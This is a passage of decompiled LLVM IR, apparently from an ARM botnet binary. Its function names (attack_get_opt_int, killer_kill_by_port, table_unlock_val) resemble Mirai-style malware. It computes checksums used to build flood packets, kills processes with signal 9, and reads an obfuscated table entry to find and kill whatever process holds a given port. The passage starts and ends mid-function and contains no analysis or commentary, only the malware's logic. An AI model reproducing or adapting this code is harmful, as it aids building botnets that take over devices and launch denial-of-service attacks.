  uselistorder i32 (i32, i32*, i32, i32, i32)* @attack_get_opt_int, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 87, 88, 89, 90, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c840, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c720, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c6d0, { 1, 0 }
  uselistorder label %dec_label_pc_c6c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c6c0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_c690, { 1, 0 }
  uselistorder label %.thread18, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %dec_label_pc_c3e0, { 1, 0 }
  uselistorder label %dec_label_pc_c3d0, { 1, 0 }
  uselistorder label %dec_label_pc_c39c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c394, { 1, 0 }
}

define i32 @checksum_generic(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_c8b0, label %dec_label_pc_c898

dec_label_pc_c898:                                ; preds = %entry
  %v0_c8a0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c89c

dec_label_pc_c89c:                                ; preds = %dec_label_pc_c89c, %dec_label_pc_c898
  %v0_c8a8 = phi i32 [ %v2_c8a8, %dec_label_pc_c89c ], [ 0, %dec_label_pc_c898 ]
  %v0_c8a0 = phi i32 [ %v5_c8a0, %dec_label_pc_c89c ], [ %v0_c8a0.pre, %dec_label_pc_c898 ]
  %v0_c89c = phi i32 [ %v1_c89c, %dec_label_pc_c89c ], [ %arg1, %dec_label_pc_c898 ]
  %v1_c89c = add i32 %v0_c89c, -2
  %v1_c8a0 = inttoptr i32 %v0_c8a0 to i16*
  %v2_c8a0 = load i16, i16* %v1_c8a0, align 2
  %v3_c8a0 = zext i16 %v2_c8a0 to i32
  %v5_c8a0 = add i32 %v0_c8a0, -2
  store i32 %v5_c8a0, i32* @r0, align 4
  %v2_c8a8 = add i32 %v3_c8a0, %v0_c8a8
  %v1_c89c.cmp = icmp ugt i32 %v1_c89c, 1
  br i1 %v1_c89c.cmp, label %dec_label_pc_c89c, label %dec_label_pc_c8b0.loopexit

dec_label_pc_c8b0.loopexit:                       ; preds = %dec_label_pc_c89c
  br label %dec_label_pc_c8b0

dec_label_pc_c8b0:                                ; preds = %entry, %dec_label_pc_c8b0.loopexit
  %v1_c8b8 = phi i32 [ %v2_c8a8, %dec_label_pc_c8b0.loopexit ], [ 0, %entry ]
  %v0_c8b0 = phi i32 [ %v1_c89c, %dec_label_pc_c8b0.loopexit ], [ %arg1, %entry ]
  %v7_c8b0 = icmp eq i32 %v0_c8b0, 1
  br i1 %v7_c8b0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c8b0
  %v1_c8b4 = load i32, i32* @r0, align 4
  %v2_c8b4 = inttoptr i32 %v1_c8b4 to i8*
  %v3_c8b4 = load i8, i8* %v2_c8b4, align 1
  %v4_c8b4 = zext i8 %v3_c8b4 to i32
  %v3_c8b8 = add i32 %v1_c8b8, %v4_c8b4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c8b0, %bb
  %v0_c8bc = phi i32 [ %v1_c8b8, %dec_label_pc_c8b0 ], [ %v3_c8b8, %bb ]
  %v3_c8c0 = urem i32 %v0_c8bc, 65536
  %v4_c8c4 = udiv i32 %v0_c8bc, 65536
  %v5_c8c4 = add nuw nsw i32 %v4_c8c4, %v3_c8c0
  %v4_c8c8 = udiv i32 %v5_c8c4, 65536
  %v5_c8c8 = add nuw nsw i32 %v4_c8c8, %v5_c8c4
  %v1_c8cc = urem i32 %v5_c8c8, 65536
  %v3_c8d4 = xor i32 %v1_c8cc, 65535
  ret i32 %v3_c8d4

; uselistorder directives
  uselistorder i32 %v5_c8c4, { 1, 0 }
  uselistorder i32 %v5_c8a0, { 1, 0 }
  uselistorder i32 %v1_c89c, { 1, 0, 2 }
  uselistorder i32 %v0_c8a0, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_c8b0, { 1, 0 }
}

define i32 @checksum_tcpudp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_c8ec = add i32 %arg1, 12
  %v2_c8ec = inttoptr i32 %v1_c8ec to i32*
  %v3_c8ec = load i32, i32* %v2_c8ec, align 4
  %v1_c8f0 = add i32 %arg1, 16
  %v2_c8f0 = inttoptr i32 %v1_c8f0 to i32*
  %v3_c8f0 = load i32, i32* %v2_c8f0, align 4
  %v7_c8f4 = icmp sgt i32 %arg3, 1
  br i1 %v7_c8f4, label %dec_label_pc_c900.preheader, label %dec_label_pc_c914

dec_label_pc_c900.preheader:                      ; preds = %entry
  %v0_c904.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_c900

dec_label_pc_c900:                                ; preds = %dec_label_pc_c900.preheader, %dec_label_pc_c900
  %v0_c90c = phi i32 [ 0, %dec_label_pc_c900.preheader ], [ %v2_c90c, %dec_label_pc_c900 ]
  %v0_c904 = phi i32 [ %v0_c904.pre, %dec_label_pc_c900.preheader ], [ %v5_c904, %dec_label_pc_c900 ]
  %v0_c900 = phi i32 [ %arg3, %dec_label_pc_c900.preheader ], [ %v1_c900, %dec_label_pc_c900 ]
  %v1_c900 = add nsw i32 %v0_c900, -2
  %v1_c904 = inttoptr i32 %v0_c904 to i16*
  %v2_c904 = load i16, i16* %v1_c904, align 2
  %v3_c904 = zext i16 %v2_c904 to i32
  %v5_c904 = add i32 %v0_c904, -2
  store i32 %v5_c904, i32* @r1, align 4
  %v2_c90c = add i32 %v3_c904, %v0_c90c
  %v8_c910 = icmp sgt i32 %v1_c900, 1
  br i1 %v8_c910, label %dec_label_pc_c900, label %dec_label_pc_c914.loopexit

dec_label_pc_c914.loopexit:                       ; preds = %dec_label_pc_c900
  br label %dec_label_pc_c914

dec_label_pc_c914:                                ; preds = %dec_label_pc_c914.loopexit, %entry
  %v1_c920 = phi i32 [ %v2_c90c, %dec_label_pc_c914.loopexit ], [ 0, %entry ]
  %v0_c914 = phi i32 [ %v1_c900, %dec_label_pc_c914.loopexit ], [ %arg3, %entry ]
  %v7_c914 = icmp eq i32 %v0_c914, 1
  br i1 %v7_c914, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_c914
  br label %bb19

bb:                                               ; preds = %dec_label_pc_c914
  %v1_c918 = load i32, i32* @r1, align 4
  %v2_c918 = inttoptr i32 %v1_c918 to i8*
  %v3_c918 = load i8, i8* %v2_c918, align 1
  %v4_c918 = zext i8 %v3_c918 to i32
  %v3_c920 = add i32 %v4_c918, %v1_c920
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_c948 = phi i32 [ %v1_c920, %.thread ], [ %v3_c920, %bb ]
  %v0_c928 = mul i32 %v3_c8ec, 65536
  %v3_c928 = udiv i32 %v0_c928, 65536
  %v3_c92c = urem i32 %v3_c8f0, 65536
  %v4_c934 = udiv i32 %v3_c8ec, 65536
  %v2_c930 = add nuw nsw i32 %v3_c92c, %v4_c934
  %v5_c934 = add nuw nsw i32 %v2_c930, %v3_c928
  %v1_c938 = add i32 %arg1, 9
  %v2_c938 = inttoptr i32 %v1_c938 to i8*
  %v3_c938 = load i8, i8* %v2_c938, align 1
  %v4_c938 = zext i8 %v3_c938 to i32
  %v4_c93c = udiv i32 %v3_c8f0, 65536
  %v3_c944 = mul nuw nsw i32 %v4_c938, 256
  %v5_c93c = add i32 %v4_c93c, %arg2
  %v2_c940 = add i32 %v5_c93c, %v1_c948
  %v2_c948 = add i32 %v2_c940, %v5_c934
  %v2_c94c = add i32 %v2_c948, %v3_c944
  %tmp = icmp ult i32 %v2_c94c, 65536
  br i1 %tmp, label %dec_label_pc_c96c, label %dec_label_pc_c958

dec_label_pc_c958:                                ; preds = %bb19, %dec_label_pc_c958
  %v2_c9605 = phi i32 [ %v2_c960, %dec_label_pc_c958 ], [ %v2_c94c, %bb19 ]
  %v3_c9646.in = phi i32 [ %v2_c960, %dec_label_pc_c958 ], [ %v2_c94c, %bb19 ]
  %v3_c9646 = udiv i32 %v3_c9646.in, 65536
  %v3_c95c = urem i32 %v2_c9605, 65536
  %v2_c960 = add nuw nsw i32 %v3_c95c, %v3_c9646
  %tmp20 = icmp ult i32 %v2_c960, 65536
  br i1 %tmp20, label %dec_label_pc_c96c.loopexit, label %dec_label_pc_c958

dec_label_pc_c96c.loopexit:                       ; preds = %dec_label_pc_c958
  br label %dec_label_pc_c96c

dec_label_pc_c96c:                                ; preds = %dec_label_pc_c96c.loopexit, %bb19
  %v0_c96c = phi i32 [ %v2_c960, %dec_label_pc_c96c.loopexit ], [ %v2_c94c, %bb19 ]
  %v1_c96c = urem i32 %v0_c96c, 65536
  %v3_c974 = xor i32 %v1_c96c, 65535
  ret i32 %v3_c974

; uselistorder directives
  uselistorder i32 %v2_c960, { 2, 1, 3, 0 }
  uselistorder i32 %v2_c94c, { 3, 0, 2, 1 }
  uselistorder i32 %v1_c920, { 1, 0 }
  uselistorder i32 %v5_c904, { 1, 0 }
  uselistorder i32 %v0_c904, { 1, 0 }
  uselistorder i32 %v3_c8ec, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c958, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_c900, { 1, 0 }
}

define i32 @killer_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_c98c = load i32, i32* @global_var_24f18.74, align 4
  %v2_c994 = call i32 @kill(i32 %v2_c98c, i32 9)
  ret i32 %v2_c994
}

define i32 @killer_kill_by_port(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-4681 = alloca i32, align 4
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-585 = alloca i8, align 1
  %v3_c9a8 = load i32, i32* @r4, align 4
  %v6_c9a8 = load i32, i32* @r5, align 4
  %v9_c9a8 = load i32, i32* @r6, align 4
  %v12_c9a8 = load i32, i32* @r7, align 4
  %v15_c9a8 = load i32, i32* @r8, align 4
  %v18_c9a8 = load i32, i32* @sb, align 4
  %v21_c9a8 = load i32, i32* @sl, align 4
  %v24_c9a8 = load i32, i32* @fp, align 4
  %v27_c9a8 = load i32, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  %v2_c9c4 = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_c9c4, i32* @r6, align 4
  store i32 0, i32* %stack_var_-56, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_c9f0 = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_c9f0, i32* @fp, align 4
  %v4_c9fc = call i32 @__GI_memset(i8* nonnull %stack_var_-585, i32 0, i32 513)
  %v2_ca00 = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_ca00, i32* @sl, align 4
  %v0_ca04 = load i32, i32* @r5, align 4
  %v3_ca10 = bitcast i32* %stack_var_-8777 to i8*
  %v4_ca10 = call i32 @__GI_memset(i8* %v3_ca10, i32 %v0_ca04, i32 4096)
  %v0_ca18 = load i32, i32* @r5, align 4
  %v3_ca24 = bitcast i32* %stack_var_-4681 to i8*
  %v4_ca24 = call i32 @__GI_memset(i8* %v3_ca24, i32 %v0_ca18, i32 4096)
  %v2_ca28 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_ca28, i32* @sb, align 4
  %v0_ca2c = load i32, i32* %r4.global-to-local, align 4
  %v3_ca2c = udiv i32 %v0_ca2c, 256
  %v1_ca30 = urem i32 %v0_ca2c, 256
  store i32 %v1_ca30, i32* @r4, align 4
  %v3_ca40 = trunc i32 %v3_ca2c to i8
  %v4_ca40 = call i32 @util_itoa(i8 %v3_ca40, i32 16, i32 %v2_ca28)
  %v2_ca48 = call i32 @util_strlen(i8* nonnull %stack_var_-72)
  %v7_ca4c = icmp eq i32 %v2_ca48, 2
  br i1 %v7_ca4c, label %dec_label_pc_cf10, label %dec_label_pc_ca54

dec_label_pc_ca54:                                ; preds = %entry, %dec_label_pc_cf10
  %v1_ca58 = call i32 @table_unlock_val(i32 15)
  %v1_ca60 = call i32 @table_unlock_val(i32 16)
  %v1_ca68 = call i32 @table_unlock_val(i32 17)
  %v1_ca70 = call i32 @table_unlock_val(i32 19)
  %v0_ca74 = load i32, i32* @r5, align 4
  %v2_ca7c = inttoptr i32 %v0_ca74 to i32*
  %v3_ca7c = call i32 @table_retrieve_val(i32 19, i32* %v2_ca7c)
  %v0_ca80 = load i32, i32* @r5, align 4
  %v2_ca84 = call i32 @__libc_open(i32 %v3_ca7c, i32 %v0_ca80)
  %v7_ca88 = icmp eq i32 %v2_ca84, -1
  store i32 %v2_ca84, i32* @r8, align 4
  br i1 %v7_ca88, label %bb, label %dec_label_pc_ca98.preheader

bb:                                               ; preds = %dec_label_pc_ca54
  %v1_ca90 = load i32, i32* @r5, align 4
  store i32 %v1_ca90, i32* @r4, align 4
  br label %dec_label_pc_ceac

dec_label_pc_ca98.preheader:                      ; preds = %dec_label_pc_ca54
  %v4_caa456 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v2_ca84)
  %v2_caa858 = icmp eq i32 %v4_caa456, 0
  br i1 %v2_caa858, label %dec_label_pc_cc30.loopexit, label %dec_label_pc_cab0.lr.ph

dec_label_pc_cab0.lr.ph:                          ; preds = %dec_label_pc_ca98.preheader
  %v2_caf8 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_cab0

dec_label_pc_cab0:                                ; preds = %dec_label_pc_cab0.lr.ph, %dec_label_pc_ca98.backedge
  %v3_cab4 = load i8, i8* %stack_var_-585, align 1
  %v4_cab4 = sext i8 %v3_cab4 to i32
  store i32 %v4_cab4, i32* @r3, align 4
  %v2_cab8 = icmp eq i8 %v3_cab4, 0
  br i1 %v2_cab8, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_cab0
  %v8_cabc = icmp eq i8 %v3_cab4, 58
  br i1 %v8_cabc, label %.thread8, label %dec_label_pc_cad0

.thread8:                                         ; preds = %bb125
  br label %dec_label_pc_cae8

bb126:                                            ; preds = %dec_label_pc_cab0
  br label %dec_label_pc_cae8

dec_label_pc_cad0:                                ; preds = %bb125
  %v1_cad8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_cad4

dec_label_pc_cad4:                                ; preds = %bb127, %dec_label_pc_cad0
  %v0_cad4 = phi i32 [ %v1_cad4, %bb127 ], [ 0, %dec_label_pc_cad0 ]
  %v1_cad4 = add i32 %v0_cad4, 1
  %v2_cad8 = add i32 %v1_cad4, %v1_cad8.pre
  %v3_cad8 = inttoptr i32 %v2_cad8 to i8*
  %v4_cad8 = load i8, i8* %v3_cad8, align 1
  %v6_cad8 = zext i8 %v4_cad8 to i32
  store i32 %v6_cad8, i32* @r3, align 4
  %v2_cadc = icmp eq i8 %v4_cad8, 0
  br i1 %v2_cadc, label %dec_label_pc_cae8, label %bb127

bb127:                                            ; preds = %dec_label_pc_cad4
  %v8_cae0 = icmp eq i8 %v4_cad8, 58
  br i1 %v8_cae0, label %dec_label_pc_cae8, label %dec_label_pc_cad4

dec_label_pc_cae8:                                ; preds = %dec_label_pc_cad4, %bb127, %bb126, %.thread8
  %v1_cb14 = phi i32 [ 0, %.thread8 ], [ 0, %bb126 ], [ %v1_cad4, %bb127 ], [ %v1_cad4, %dec_label_pc_cad4 ]
  %v0_cae8 = phi i32 [ %v4_cab4, %.thread8 ], [ %v4_cab4, %bb126 ], [ %v6_cad8, %bb127 ], [ %v6_cad8, %dec_label_pc_cad4 ]
  %v2_cae8 = icmp eq i32 %v0_cae8, 0
  br i1 %v2_cae8, label %dec_label_pc_ca98.backedge, label %dec_label_pc_caf0

dec_label_pc_ca98.backedge:                       ; preds = %dec_label_pc_cae8, %dec_label_pc_cbb8, %dec_label_pc_cc04, %dec_label_pc_cb34
  %v0_caa0 = load i32, i32* @r8, align 4
  %v4_caa4 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v0_caa0)
  %v2_caa8 = icmp eq i32 %v4_caa4, 0
  br i1 %v2_caa8, label %dec_label_pc_cc30.loopexit, label %dec_label_pc_cab0

dec_label_pc_caf0:                                ; preds = %dec_label_pc_cae8
  %v1_caf4 = add i32 %v1_cb14, 2
  %v2_cafc = add i32 %v1_caf4, %v2_caf8
  %v1_cb00 = add i32 %v2_cafc, -545
  %v2_cb00 = inttoptr i32 %v1_cb00 to i8*
  %v3_cb00 = load i8, i8* %v2_cb00, align 1
  %v2_cb04 = icmp eq i8 %v3_cb00, 0
  br i1 %v2_cb04, label %bb129, label %bb128

bb128:                                            ; preds = %dec_label_pc_caf0
  %v8_cb08 = icmp eq i8 %v3_cb00, 32
  br i1 %v8_cb08, label %.thread13, label %dec_label_pc_cb14

.thread13:                                        ; preds = %bb128
  store i32 %v1_caf4, i32* @r5, align 4
  br label %dec_label_pc_cb34

bb129:                                            ; preds = %dec_label_pc_caf0
  store i32 %v1_caf4, i32* @r5, align 4
  br label %dec_label_pc_cb34

dec_label_pc_cb14:                                ; preds = %bb128
  %v0_cb14 = load i32, i32* @r6, align 4
  %v2_cb14 = add i32 %v0_cb14, %v1_cb14
  br label %dec_label_pc_cb1c

dec_label_pc_cb1c:                                ; preds = %bb130, %dec_label_pc_cb14
  %v0_cb2816 = phi i32 [ %v1_cb28, %bb130 ], [ %v1_caf4, %dec_label_pc_cb14 ]
  %v0_cb2c18 = phi i32 [ %v1_cb2c, %bb130 ], [ %v2_cb14, %dec_label_pc_cb14 ]
  %v1_cb1c = add i32 %v0_cb2c18, 3
  %v2_cb1c = inttoptr i32 %v1_cb1c to i8*
  %v3_cb1c = load i8, i8* %v2_cb1c, align 1
  %v2_cb20 = icmp eq i8 %v3_cb1c, 0
  br i1 %v2_cb20, label %.thread15, label %bb130

.thread15:                                        ; preds = %dec_label_pc_cb1c
  %v1_cb2817 = add i32 %v0_cb2816, 1
  store i32 %v1_cb2817, i32* @r5, align 4
  br label %dec_label_pc_cb34

bb130:                                            ; preds = %dec_label_pc_cb1c
  %v8_cb24 = icmp eq i8 %v3_cb1c, 32
  %v1_cb28 = add i32 %v0_cb2816, 1
  store i32 %v1_cb28, i32* @r5, align 4
  %v1_cb2c = add i32 %v0_cb2c18, 1
  br i1 %v8_cb24, label %dec_label_pc_cb34, label %dec_label_pc_cb1c

dec_label_pc_cb34:                                ; preds = %bb130, %bb129, %.thread15, %.thread13
  %v1_cb40 = phi i32 [ %v1_cb2817, %.thread15 ], [ %v1_caf4, %.thread13 ], [ %v1_caf4, %bb129 ], [ %v1_cb28, %bb130 ]
  %v0_cb34 = load i32, i32* @r6, align 4
  %v2_cb34 = add i32 %v0_cb34, %v1_caf4
  store i32 %v2_cb34, i32* @r4, align 4
  %v2_cb40 = add i32 %v1_cb40, %v2_caf8
  store i32 0, i32* @r7, align 4
  %v3_cb48 = add i32 %v2_cb40, -545
  %v4_cb48 = inttoptr i32 %v3_cb48 to i8*
  store i8 0, i8* %v4_cb48, align 1
  %v0_cb4c = load i32, i32* @r4, align 4
  %v1_cb50 = inttoptr i32 %v0_cb4c to i8*
  %v2_cb50 = call i32 @util_strlen(i8* %v1_cb50)
  store i32 %v2_cb50, i32* @r1, align 4
  %v0_cb5c = load i32, i32* @r4, align 4
  %v3_cb60 = inttoptr i32 %v0_cb5c to i8*
  %v4_cb60 = call i32 @util_stristr(i8* %v3_cb60, i32 %v2_cb50, i32 %v2_ca28)
  %v7_cb64 = icmp eq i32 %v4_cb60, -1
  br i1 %v7_cb64, label %dec_label_pc_ca98.backedge, label %dec_label_pc_cb80.preheader

dec_label_pc_cb80.preheader:                      ; preds = %dec_label_pc_cb34
  %v1_cb68 = load i32, i32* @r7, align 4
  %v1_cb6c = load i32, i32* @r6, align 4
  %v2_cb6c = load i32, i32* @r5, align 4
  %v3_cb6c = add i32 %v2_cb6c, %v1_cb6c
  store i32 %v1_cb68, i32* @lr, align 4
  %v1_cb8048 = add i32 %v3_cb6c, 2
  %v2_cb8049 = inttoptr i32 %v1_cb8048 to i8*
  %v3_cb8050 = load i8, i8* %v2_cb8049, align 1
  %v4_cb8051 = zext i8 %v3_cb8050 to i32
  store i32 %v4_cb8051, i32* @r3, align 4
  %v2_cb8452 = icmp eq i8 %v3_cb8050, 0
  %v1_cb8854 = add i32 %v2_cb6c, 2
  br i1 %v2_cb8452, label %dec_label_pc_cbb8, label %dec_label_pc_cb90

dec_label_pc_cb90:                                ; preds = %dec_label_pc_cb80.preheader, %dec_label_pc_cb80.backedge
  %v0_cbb883 = phi i32 [ %v0_cbb881, %dec_label_pc_cb80.backedge ], [ %v1_cb68, %dec_label_pc_cb80.preheader ]
  %v0_cba0.pr = phi i32 [ %v0_cba0.pr70, %dec_label_pc_cb80.backedge ], [ %v1_cb68, %dec_label_pc_cb80.preheader ]
  %v0_cec0 = phi i32 [ %v0_cec073, %dec_label_pc_cb80.backedge ], [ %v1_cb68, %dec_label_pc_cb80.preheader ]
  %v0_cb8878 = phi i32 [ %v1_cb88, %dec_label_pc_cb80.backedge ], [ %v1_cb8854, %dec_label_pc_cb80.preheader ]
  %v0_cbb0 = phi i32 [ %v0_cb80, %dec_label_pc_cb80.backedge ], [ %v3_cb6c, %dec_label_pc_cb80.preheader ]
  %v1_cb94 = phi i32 [ %v4_cb80, %dec_label_pc_cb80.backedge ], [ %v4_cb8051, %dec_label_pc_cb80.preheader ]
  %v7_cb90 = icmp eq i32 %v1_cb94, 9
  br i1 %v7_cb90, label %bb132, label %bb131

bb131:                                            ; preds = %dec_label_pc_cb90
  %v8_cb94 = icmp eq i32 %v1_cb94, 32
  br i1 %v8_cb94, label %.thread27, label %dec_label_pc_cba0

.thread27:                                        ; preds = %bb131
  br label %dec_label_pc_cbac

bb132:                                            ; preds = %dec_label_pc_cb90
  br label %dec_label_pc_cbac

dec_label_pc_cba0:                                ; preds = %bb131
  %v7_cba0 = icmp eq i32 %v0_cba0.pr, 1
  br i1 %v7_cba0, label %dec_label_pc_cec0, label %dec_label_pc_cba8

dec_label_pc_cba8:                                ; preds = %dec_label_pc_cec0, %dec_label_pc_cba0
  %v0_cbac75 = phi i32 [ %v1_cec0, %dec_label_pc_cec0 ], [ %v0_cec0, %dec_label_pc_cba0 ]
  br label %dec_label_pc_cbac

dec_label_pc_cbac:                                ; preds = %bb132, %.thread27, %dec_label_pc_cba8
  %v0_cbac = phi i32 [ %v0_cec0, %.thread27 ], [ %v0_cec0, %bb132 ], [ %v0_cbac75, %dec_label_pc_cba8 ]
  %v0_cba0.pr71 = phi i32 [ 1, %.thread27 ], [ 1, %bb132 ], [ 0, %dec_label_pc_cba8 ]
  %v7_cbb4 = icmp sgt i32 %v0_cbac, 6
  br i1 %v7_cbb4, label %dec_label_pc_cbb8, label %dec_label_pc_cb80.backedge

dec_label_pc_cbb8:                                ; preds = %dec_label_pc_cb80.backedge, %dec_label_pc_cbac, %dec_label_pc_cb80.preheader
  %v1_cc08 = phi i32 [ %v1_cb8854, %dec_label_pc_cb80.preheader ], [ %v1_cb88, %dec_label_pc_cb80.backedge ], [ %v0_cb8878, %dec_label_pc_cbac ]
  %v0_cbb8 = phi i32 [ %v1_cb68, %dec_label_pc_cb80.preheader ], [ %v0_cbb881, %dec_label_pc_cb80.backedge ], [ %v0_cbb883, %dec_label_pc_cbac ]
  %v2_cbb8 = icmp eq i32 %v0_cbb8, 0
  br i1 %v2_cbb8, label %dec_label_pc_ca98.backedge, label %dec_label_pc_cbc4

dec_label_pc_cbc4:                                ; preds = %dec_label_pc_cbb8
  %v2_cbcc = add i32 %v1_cc08, %v2_caf8
  %v1_cbd0 = add i32 %v2_cbcc, -545
  %v2_cbd0 = inttoptr i32 %v1_cbd0 to i8*
  %v3_cbd0 = load i8, i8* %v2_cbd0, align 1
  %v2_cbd4 = icmp eq i8 %v3_cbd0, 0
  br i1 %v2_cbd4, label %dec_label_pc_cc04, label %bb133

bb133:                                            ; preds = %dec_label_pc_cbc4
  %v8_cbd8 = icmp eq i8 %v3_cbd0, 32
  br i1 %v8_cbd8, label %dec_label_pc_cc04, label %dec_label_pc_cbe0

dec_label_pc_cbe0:                                ; preds = %bb133
  %v2_cbe0 = add i32 %v1_cc08, %v1_cb6c
  br label %dec_label_pc_cbe4

dec_label_pc_cbe4:                                ; preds = %bb134, %dec_label_pc_cbe0
  %v0_cbf030 = phi i32 [ %v1_cbf0, %bb134 ], [ %v1_cc08, %dec_label_pc_cbe0 ]
  %v0_cbe4 = phi i32 [ %v1_cbe4, %bb134 ], [ %v2_cbe0, %dec_label_pc_cbe0 ]
  %v1_cbe4 = add i32 %v0_cbe4, 1
  %v2_cbe4 = inttoptr i32 %v1_cbe4 to i8*
  %v3_cbe4 = load i8, i8* %v2_cbe4, align 1
  %v2_cbe8 = icmp eq i8 %v3_cbe4, 0
  br i1 %v2_cbe8, label %.thread29, label %bb134

.thread29:                                        ; preds = %dec_label_pc_cbe4
  %v1_cbf031 = add i32 %v0_cbf030, 1
  br label %dec_label_pc_cbf8

bb134:                                            ; preds = %dec_label_pc_cbe4
  %v8_cbec = icmp eq i8 %v3_cbe4, 32
  %v1_cbf0 = add i32 %v0_cbf030, 1
  br i1 %v8_cbec, label %dec_label_pc_cbf8, label %dec_label_pc_cbe4

dec_label_pc_cbf8:                                ; preds = %bb134, %.thread29
  %v1_cc00 = phi i32 [ %v1_cbf031, %.thread29 ], [ %v1_cbf0, %bb134 ]
  %v2_cc00 = add i32 %v1_cc00, %v2_caf8
  br label %dec_label_pc_cc04

dec_label_pc_cc04:                                ; preds = %dec_label_pc_cbc4, %bb133, %dec_label_pc_cbf8
  %v2_cc10 = phi i32 [ %v2_cbcc, %dec_label_pc_cbc4 ], [ %v2_cbcc, %bb133 ], [ %v2_cc00, %dec_label_pc_cbf8 ]
  %v2_cc08 = add i32 %v1_cc08, %v1_cb6c
  store i32 %v2_cc08, i32* @r4, align 4
  %v3_cc10 = add i32 %v2_cc10, -545
  %v4_cc10 = inttoptr i32 %v3_cc10 to i8*
  store i8 0, i8* %v4_cc10, align 1
  %v1_cc14 = inttoptr i32 %v2_cc08 to i8*
  %v2_cc14 = call i32 @util_strlen(i8* %v1_cc14)
  %v8_cc1c = icmp sgt i32 %v2_cc14, 15
  br i1 %v8_cc1c, label %dec_label_pc_ca98.backedge, label %dec_label_pc_cc20

dec_label_pc_cc20:                                ; preds = %dec_label_pc_cc04
  %v0_cc24 = load i32, i32* @r4, align 4
  %v2_cc28 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_cc28, i32* @r0, align 4
  %v2_cc2c = bitcast i32* %stack_var_-56 to i8*
  %v3_cc2c = call i32 @util_strcpy(i8* %v2_cc2c, i32 %v0_cc24)
  br label %dec_label_pc_cc30

dec_label_pc_cc30.loopexit:                       ; preds = %dec_label_pc_ca98.backedge, %dec_label_pc_ca98.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre92 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_cc30

dec_label_pc_cc30:                                ; preds = %dec_label_pc_cc30.loopexit, %dec_label_pc_cc20
  %v1_cc40.pre-phi = phi i8* [ %.pre92, %dec_label_pc_cc30.loopexit ], [ %v2_cc2c, %dec_label_pc_cc20 ]
  %v2_cc3c.pre-phi = phi i32 [ %.pre, %dec_label_pc_cc30.loopexit ], [ %v2_cc28, %dec_label_pc_cc20 ]
  %v0_cc30 = load i32, i32* @r8, align 4
  %v1_cc34 = call i32 @__GI___libc_close(i32 %v0_cc30)
  %v2_cc40 = call i32 @util_strlen(i8* %v1_cc40.pre-phi)
  store i32 %v2_cc40, i32* @r4, align 4
  %v2_cc44 = icmp eq i32 %v2_cc40, 0
  br i1 %v2_cc44, label %dec_label_pc_ceec, label %dec_label_pc_cc4c

dec_label_pc_cc4c:                                ; preds = %dec_label_pc_cc30
  %v3_cc54 = call i32 @table_retrieve_val(i32 15, i32* null)
  %v1_cc58 = call i32 @__GI_opendir(i32 %v3_cc54)
  store i32 %v1_cc58, i32* @sb, align 4
  %v2_cc5c = icmp eq i32 %v1_cc58, 0
  br i1 %v2_cc5c, label %dec_label_pc_ce8c, label %dec_label_pc_cc6c.preheader

dec_label_pc_cc6c.preheader:                      ; preds = %dec_label_pc_cc4c
  store i32 0, i32* @r5, align 4
  %v1_cc7043 = inttoptr i32 %v1_cc58 to i32*
  %v2_cc7044 = call i32 @__GI_readdir(i32* %v1_cc7043)
  %v2_cc7446 = icmp eq i32 %v2_cc7044, 0
  br i1 %v2_cc7446, label %dec_label_pc_ce80, label %dec_label_pc_cc7c.preheader

